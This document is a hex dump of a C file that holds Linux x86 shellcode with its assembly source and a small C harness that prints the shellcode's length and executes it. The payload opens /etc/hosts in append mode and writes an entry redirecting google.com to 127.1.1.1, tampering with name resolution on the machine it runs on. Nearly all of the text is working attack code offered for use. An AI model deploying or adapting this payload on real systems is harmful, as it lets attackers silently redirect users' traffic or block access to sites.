00000000  2f 2a 2a 0a 0a 3b 6d 6f  64 69 66 79 5f 68 6f 73  |/**..;modify_hos|
00000010  74 73 2e 61 73 6d 0a 3b  74 68 69 73 20 70 72 6f  |ts.asm.;this pro|
00000020  67 72 61 6d 20 61 64 64  20 61 20 6e 65 77 20 65  |gram add a new e|
00000030  6e 74 72 79 20 69 6e 20  68 6f 73 74 73 20 66 69  |ntry in hosts fi|
00000040  6c 65 20 70 6f 69 6e 74  69 6e 67 20 67 6f 6f 67  |le pointing goog|
00000050  6c 65 2e 63 6f 6d 20 74  6f 20 31 32 37 2e 31 2e  |le.com to 127.1.|
00000060  31 2e 31 20 0a 3b 61 75  74 68 6f 72 20 4a 61 76  |1.1 .;author Jav|
00000070  69 65 72 20 54 65 6a 65  64 6f 72 0a 3b 64 61 74  |ier Tejedor.;dat|
00000080  65 20 32 34 2f 30 39 2f  32 30 31 34 0a 0a 67 6c  |e 24/09/2014..gl|
00000090  6f 62 61 6c 20 5f 73 74  61 72 74 0a 0a 73 65 63  |obal _start..sec|
000000a0  74 69 6f 6e 20 2e 74 65  78 74 0a 0a 5f 73 74 61  |tion .text.._sta|
000000b0  72 74 3a 0a 20 20 20 20  78 6f 72 20 65 63 78 2c  |rt:.    xor ecx,|
000000c0  20 65 63 78 0a 20 20 20  20 6d 75 6c 20 65 63 78  | ecx.    mul ecx|
000000d0  0a 20 20 20 20 6d 6f 76  20 61 6c 2c 20 30 78 35  |.    mov al, 0x5|
000000e0  20 20 20 20 20 0a 20 20  20 20 70 75 73 68 20 65  |     .    push e|
000000f0  63 78 0a 20 20 20 20 70  75 73 68 20 30 78 37 33  |cx.    push 0x73|
00000100  37 34 37 33 36 66 20 20  20 20 20 3b 2f 65 74 63  |74736f     ;/etc|
00000110  2f 2f 2f 68 6f 73 74 73  0a 20 20 20 20 70 75 73  |///hosts.    pus|
00000120  68 20 30 78 36 38 32 66  32 66 32 66 0a 20 20 20  |h 0x682f2f2f.   |
00000130  20 70 75 73 68 20 30 78  36 33 37 34 36 35 32 66  | push 0x6374652f|
00000140  0a 20 20 20 20 6d 6f 76  20 65 62 78 2c 20 65 73  |.    mov ebx, es|
00000150  70 0a 20 20 20 20 6d 6f  76 20 63 78 2c 20 30 78  |p.    mov cx, 0x|
00000160  34 30 31 20 20 20 20 20  20 20 3b 70 65 72 6d 6d  |401       ;permm|
00000170  69 73 69 6f 6e 73 0a 20  20 20 20 69 6e 74 20 30  |isions.    int 0|
00000180  78 38 30 20 20 20 20 20  20 20 20 3b 73 79 73 63  |x80        ;sysc|
00000190  61 6c 6c 20 74 6f 20 6f  70 65 6e 20 66 69 6c 65  |all to open file|
000001a0  0a 0a 20 20 20 20 78 63  68 67 20 65 61 78 2c 20  |..    xchg eax, |
000001b0  65 62 78 0a 20 20 20 20  70 75 73 68 20 30 78 34  |ebx.    push 0x4|
000001c0  0a 20 20 20 20 70 6f 70  20 65 61 78 0a 20 20 20  |.    pop eax.   |
000001d0  20 6a 6d 70 20 73 68 6f  72 74 20 5f 6c 6f 61 64  | jmp short _load|
000001e0  5f 64 61 74 61 20 20 20  20 3b 6a 6d 70 2d 63 61  |_data    ;jmp-ca|
000001f0  6c 6c 2d 70 6f 70 20 74  65 63 68 6e 69 71 75 65  |ll-pop technique|
00000200  20 74 6f 20 6c 6f 61 64  20 74 68 65 20 6d 61 70  | to load the map|
00000210  0a 0a 5f 77 72 69 74 65  3a 0a 20 20 20 20 70 6f  |.._write:.    po|
00000220  70 20 65 63 78 0a 20 20  20 20 70 75 73 68 20 32  |p ecx.    push 2|
00000230  30 20 20 20 20 20 20 20  20 20 3b 6c 65 6e 67 74  |0         ;lengt|
00000240  68 20 6f 66 20 74 68 65  20 73 74 72 69 6e 67 2c  |h of the string,|
00000250  20 64 6f 6e 74 20 66 6f  72 67 65 74 20 74 6f 20  | dont forget to |
00000260  6d 6f 64 69 66 79 20 69  66 20 63 68 61 6e 67 65  |modify if change|
00000270  73 20 74 68 65 20 6d 61  70 0a 20 20 20 20 70 6f  |s the map.    po|
00000280  70 20 65 64 78 0a 20 20  20 20 69 6e 74 20 30 78  |p edx.    int 0x|
00000290  38 30 20 20 20 20 20 20  20 20 3b 73 79 73 63 61  |80        ;sysca|
000002a0  6c 6c 20 74 6f 20 77 72  69 74 65 20 69 6e 20 74  |ll to write in t|
000002b0  68 65 20 66 69 6c 65 0a  0a 20 20 20 20 70 75 73  |he file..    pus|
000002c0  68 20 30 78 36 0a 20 20  20 20 70 6f 70 20 65 61  |h 0x6.    pop ea|
000002d0  78 0a 20 20 20 20 69 6e  74 20 30 78 38 30 20 20  |x.    int 0x80  |
000002e0  20 20 20 20 20 20 3b 73  79 73 63 61 6c 6c 20 74  |      ;syscall t|
000002f0  6f 20 63 6c 6f 73 65 20  74 68 65 20 66 69 6c 65  |o close the file|
00000300  0a 0a 20 20 20 20 70 75  73 68 20 30 78 31 0a 20  |..    push 0x1. |
00000310  20 20 20 70 6f 70 20 65  61 78 0a 20 20 20 20 69  |   pop eax.    i|
00000320  6e 74 20 30 78 38 30 20  20 20 20 20 20 20 20 3b  |nt 0x80        ;|
00000330  73 79 73 63 61 6c 6c 20  74 6f 20 65 78 69 74 0a  |syscall to exit.|
00000340  0a 5f 6c 6f 61 64 5f 64  61 74 61 3a 0a 20 20 20  |._load_data:.   |
00000350  20 63 61 6c 6c 20 5f 77  72 69 74 65 0a 20 20 20  | call _write.   |
00000360  20 67 6f 6f 67 6c 65 20  64 62 20 22 31 32 37 2e  | google db "127.|
00000370  31 2e 31 2e 31 20 67 6f  6f 67 6c 65 2e 63 6f 6d  |1.1.1 google.com|
00000380  22 0a 2a 2a 2f 0a 0a 23  69 6e 63 6c 75 64 65 20  |".**/..#include |
00000390  3c 73 74 64 69 6f 2e 68  3e 0a 23 69 6e 63 6c 75  |<stdio.h>.#inclu|
000003a0  64 65 20 3c 73 74 72 69  6e 67 2e 68 3e 0a 0a 75  |de <string.h>..u|
000003b0  6e 73 69 67 6e 65 64 20  63 68 61 72 20 63 6f 64  |nsigned char cod|
000003c0  65 5b 5d 20 3d 20 5c 0a  22 5c 78 33 31 5c 78 63  |e[] = \."\x31\xc|
000003d0  39 5c 78 66 37 5c 78 65  31 5c 78 62 30 5c 78 30  |9\xf7\xe1\xb0\x0|
000003e0  35 5c 78 35 31 5c 78 36  38 5c 78 36 66 5c 78 37  |5\x51\x68\x6f\x7|
000003f0  33 5c 78 37 34 5c 78 37  33 5c 78 36 38 5c 78 32  |3\x74\x73\x68\x2|
00000400  66 5c 78 32 66 5c 78 32  66 5c 78 36 38 5c 78 36  |f\x2f\x2f\x68\x6|
00000410  38 5c 78 32 66 5c 78 36  35 5c 78 37 34 5c 78 36  |8\x2f\x65\x74\x6|
00000420  33 5c 78 38 39 5c 78 65  33 5c 78 36 36 5c 78 62  |3\x89\xe3\x66\xb|
00000430  39 5c 78 30 31 5c 78 30  34 5c 78 63 64 5c 78 38  |9\x01\x04\xcd\x8|
00000440  30 5c 78 39 33 5c 78 36  61 5c 78 30 34 5c 78 35  |0\x93\x6a\x04\x5|
00000450  38 5c 78 65 62 5c 78 31  30 5c 78 35 39 5c 78 36  |8\xeb\x10\x59\x6|
00000460  61 5c 78 31 34 5c 78 35  61 5c 78 63 64 5c 78 38  |a\x14\x5a\xcd\x8|
00000470  30 5c 78 36 61 5c 78 30  36 5c 78 35 38 5c 78 63  |0\x6a\x06\x58\xc|
00000480  64 5c 78 38 30 5c 78 36  61 5c 78 30 31 5c 78 35  |d\x80\x6a\x01\x5|
00000490  38 5c 78 63 64 5c 78 38  30 5c 78 65 38 5c 78 65  |8\xcd\x80\xe8\xe|
000004a0  62 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 33  |b\xff\xff\xff\x3|
000004b0  31 5c 78 33 32 5c 78 33  37 5c 78 32 65 5c 78 33  |1\x32\x37\x2e\x3|
000004c0  31 5c 78 32 65 5c 78 33  31 5c 78 32 65 5c 78 33  |1\x2e\x31\x2e\x3|
000004d0  31 5c 78 32 30 5c 78 36  37 5c 78 36 66 5c 78 36  |1\x20\x67\x6f\x6|
000004e0  66 5c 78 36 37 5c 78 36  63 5c 78 36 35 5c 78 32  |f\x67\x6c\x65\x2|
000004f0  65 5c 78 36 33 5c 78 36  66 5c 78 36 64 22 3b 0a  |e\x63\x6f\x6d";.|
00000500  0a 6d 61 69 6e 28 29 0a  7b 0a 0a 20 20 20 20 20  |.main().{..     |
00000510  20 20 20 70 72 69 6e 74  66 28 22 53 68 65 6c 6c  |   printf("Shell|
00000520  63 6f 64 65 20 4c 65 6e  67 74 68 3a 20 20 25 64  |code Length:  %d|
00000530  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 63 6f 64 65  |\n", strlen(code|
00000540  29 29 3b 0a 0a 20 20 20  20 20 20 20 20 69 6e 74  |));..        int|
00000550  20 28 2a 72 65 74 29 28  29 20 3d 20 28 69 6e 74  | (*ret)() = (int|
00000560  28 2a 29 28 29 29 63 6f  64 65 3b 0a 0a 20 20 20  |(*)())code;..   |
00000570  20 20 20 20 20 72 65 74  28 29 3b 0a 0a 7d        |     ret();..}|
0000057e
